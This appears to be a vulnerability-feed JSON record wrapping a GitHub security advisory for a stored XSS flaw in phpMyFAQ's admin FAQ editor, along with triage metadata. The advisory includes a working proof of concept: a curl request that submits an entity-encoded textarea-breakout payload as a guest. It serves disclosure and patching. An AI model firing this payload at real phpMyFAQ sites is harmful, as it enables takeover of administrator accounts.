@@ -1,0 +1,61 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/145776319?v=4\", \"events_url\": \"https://api.github.com/users/JosanGeorge/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/JosanGeorge/followers\", \"following_url\": \"https://api.github.com/users/JosanGeorge/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/JosanGeorge/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/JosanGeorge\", \"id\": 145776319, \"login\": \"JosanGeorge\", \"node_id\": \"U_kgDOCLBevw\", \"organizations_url\": \"https://api.github.com/users/JosanGeorge/orgs\", \"received_events_url\": \"https://api.github.com/users/JosanGeorge/received_events\", \"repos_url\": \"https://api.github.com/users/JosanGeorge/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/JosanGeorge/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/JosanGeorge/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/JosanGeorge\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-56736\", \"cvss\": {\"score\": 8.2, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 8.2, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-79\", \"name\": \"Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\"}], \"description\": \"### Summary\\nA stored cross-site scripting (XSS) vulnerability in phpMyFAQ allows any unauthenticated user (or low-privileged registered user) to inject arbitrary JavaScript that executes in an administrator's browser when they review or edit a user-submitted FAQ entry. This leads to admin account takeover via session theft. The vulnerability exists because `html_entity_decode()` converts HTML entities into executable HTML after `strip_tags()` has already passed them through, and the admin template renders the content with Twig's `|raw` filter without any output sanitization.\\n\\n### Details\\n**Vulnerable file:** `phpmyfaq/src/phpMyFAQ/Controller/Frontend/Api/FaqController.php` (lines 109-115)\\n\\n```php\\n$answer = Filter::filterVar($data->answer, FILTER_SANITIZE_SPECIAL_CHARS);\\nif ($this->configuration->get(item: 'main.enableWysiwygEditorFrontend')) {\\n    $answer = trim(html_entity_decode((string) $answer));\\n}\\n```\\n\\n**Root cause:**\\n\\n`Filter::filterVar()` with `FILTER_SANITIZE_SPECIAL_CHARS` internally calls `filterSanitizeString()` which applies `strip_tags()` to remove HTML tags. However, `strip_tags()` only removes **actual HTML tag syntax** (e.g., `<script>`) — it does NOT remove **HTML entities** (e.g., `&lt;script&gt;`).\\n\\nWhen `enableWysiwygEditorFrontend` is `true`, `html_entity_decode()` is subsequently called, which converts the surviving HTML entities into real, executable HTML. No server-side HTML sanitizer (such as the Symfony HtmlSanitizer already used elsewhere in the codebase) is applied before storing the content in the database.\\n\\n**Vulnerable sink (admin template):** `phpmyfaq/assets/templates/admin/content/faq.editor.twig` (line 127)\\n\\n```twig\\n<textarea id=\\\"editor\\\" name=\\\"answer\\\" class=\\\"form-control\\\" rows=\\\"7\\\"\\n          placeholder=\\\"{{ 'msgAnswer' | translate }}\\\"\\n>{{ faqData['content'] | raw }}</textarea>\\n```\\n\\nThe admin FAQ editor controller (`Administration/FaqController.php`) loads the FAQ content directly from the database and passes it to the template without sanitization:\\n\\n```php\\n$this->faq->getFaq($faqId, null, true);\\n$faqData = $this->faq->faqRecord; // Raw content from DB\\n```\\n\\n**Note:** The public-facing FAQ view IS properly sanitized via `FaqHelper::cleanUpContent()` which uses Symfony HtmlSanitizer. Only the admin edit view is vulnerable.\\n\\n\\n### PoC\\n**Prerequisites:**\\n- `main.enableWysiwygEditorFrontend` = `true` (non-default, but commonly enabled for rich-text user FAQ contributions)\\n- `records.allowNewFaqsForGuests` = `true` (DEFAULT value — guests can submit FAQs)\\n- At least one FAQ category must exist\\n\\n**Step 1: Inject XSS payload as unauthenticated guest**\\n\\n```bash\\ncurl -X POST https://TARGET/api/faq/create \\\\\\n  -H 'Content-Type: application/json' \\\\\\n  -d '{\\n    \\\"name\\\": \\\"Legitimate User\\\",\\n    \\\"email\\\": \\\"user@example.com\\\",\\n    \\\"question\\\": \\\"How to configure SMTP settings?\\\",\\n    \\\"answer\\\": \\\"&lt;/textarea&gt;&lt;img src=x onerror=alert(document.domain)&gt;&lt;textarea&gt;\\\",\\n    \\\"lang\\\": \\\"en\\\",\\n    \\\"keywords\\\": \\\"smtp email\\\",\\n    \\\"rubrik\\\": [\\\"1\\\"],\\n    \\\"captcha\\\": \\\"<valid-captcha-or-empty-if-disabled>\\\"\\n  }'\\n```\\n\\nResponse: `{\\\"success\\\":\\\"Thank you for your suggestion!\\\"}`\\n\\n**Processing trace:**\\n1. Input answer: `&lt;/textarea&gt;&lt;img src=x onerror=alert(document.domain)&gt;&lt;textarea&gt;`\\n2. `filterSanitizeString()` → `strip_tags()` finds no actual `<tag>` syntax → string passes through unchanged\\n3. `html_entity_decode()` converts entities → `</textarea><img src=x onerror=alert(document.domain)><textarea>`\\n4. Stored in database as raw executable HTML\\n\\n**Step 2: Admin triggers XSS by reviewing the submitted FAQ**\\n\\nWhen an administrator navigates to edit the submitted FAQ entry:\\n```\\nGET /admin/faq/edit/{faqId}/{lang}\\n```\\n\\nThe admin template renders:\\n```html\\n<textarea id=\\\"editor\\\" name=\\\"answer\\\" class=\\\"form-control\\\" rows=\\\"7\\\"\\n          placeholder=\\\"Answer\\\"\\n></textarea><img src=x onerror=alert(document.domain)><textarea></textarea>\\n```\\n\\nThe `</textarea>` breaks out of the editor textarea element, and the `<img onerror=...>` executes JavaScript immediately in the admin's browser context.\\n\\n<img width=\\\"1387\\\" height=\\\"562\\\" alt=\\\"admin stored xss alert poc\\\" src=\\\"https://github.com/user-attachments/assets/98d6a40d-1e21-41dc-8705-102876b9cf8a\\\" />\\n<img width=\\\"1393\\\" height=\\\"805\\\" alt=\\\"admin stored xss poc\\\" src=\\\"https://github.com/user-attachments/assets/7362a324-e779-4157-be4f-9d35fbe25333\\\" />\\n\\n\\n**Note:** For logged-in users submitting FAQs, the captcha check is automatically bypassed (`BuiltinCaptcha::checkCaptchaCode()` returns `true` when user is logged in).\\n\\n\\n### Impact\\n- **Stored XSS targeting administrators** — every FAQ submission is reviewed by an admin, guaranteeing payload delivery\\n- **Admin account takeover** — attacker can steal session cookies, create new admin accounts, or modify system configuration\\n- **No special privileges required** — default configuration allows guest FAQ submissions (`records.allowNewFaqsForGuests` = `true`)\\n- **Public view is unaffected** — the public FAQ display uses Symfony HtmlSanitizer which strips event handlers; only the admin panel is vulnerable\", \"ghsa_id\": \"GHSA-pgwp-vc7q-cvj3\", \"github_reviewed_at\": \"2026-09-24T19:28:43Z\", \"html_url\": \"https://github.com/advisories/GHSA-pgwp-vc7q-cvj3\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-pgwp-vc7q-cvj3\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-56736\"}], \"nvd_published_at\": \"2026-09-24T15:17:24Z\", \"published_at\": \"2026-09-24T19:28:43Z\", \"references\": [\"https://github.com/thorsten/phpMyFAQ/security/advisories/GHSA-pgwp-vc7q-cvj3\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-56736\", \"https://github.com/thorsten/phpMyFAQ/commit/24b68068747ad632398e3b3bab2989e76e43ef82\", \"https://github.com/thorsten/phpMyFAQ/releases/tag/4.2.0-alpha\", \"https://github.com/advisories/GHSA-pgwp-vc7q-cvj3\"], \"repository_advisory_url\": \"https://api.github.com/repos/thorsten/phpMyFAQ/security-advisories/GHSA-pgwp-vc7q-cvj3\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/thorsten/phpMyFAQ\", \"summary\": \"phpMyFAQ has Stored XSS in Admin FAQ Editor via HTML Entity Bypass in Frontend FAQ Submission\", \"type\": \"reviewed\", \"updated_at\": \"2026-09-24T19:28:44Z\", \"url\": \"https://api.github.com/advisories/GHSA-pgwp-vc7q-cvj3\", \"vulnerabilities\": [{\"first_patched_version\": \"4.2.0-alpha\", \"package\": {\"ecosystem\": \"composer\", \"name\": \"thorsten/phpmyfaq\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 4.2.0-alpha\"}, {\"first_patched_version\": \"4.2.0-alpha\", \"package\": {\"ecosystem\": \"composer\", \"name\": \"phpmyfaq/phpmyfaq\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 4.2.0-alpha\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-pgwp-vc7q-cvj3",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "kev_entries": {},
+    "kev_ransomware": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "phpmyfaq/phpmyfaq: < 4.2.0-alpha",
+      "thorsten/phpmyfaq: < 4.2.0-alpha"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-56736"
+    ],
+    "cvss_score": 8.2,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "phpmyfaq/phpmyfaq",
+      "thorsten/phpmyfaq"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-09-25T19:13:21.166026Z",
+  "provenance": {
+    "content_sha256": "c1f07a834d5d847801afa69e02b13b936cd383402c3ca514b21e72aef732135d",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-09-24T19:28:43Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-pgwp-vc7q-cvj3",
+  "status": "active",
+  "title": "phpMyFAQ has Stored XSS in Admin FAQ Editor via HTML Entity Bypass in Frontend FAQ Submission",
+  "updated_at": "2026-09-24T19:28:44Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-pgwp-vc7q-cvj3"
+}
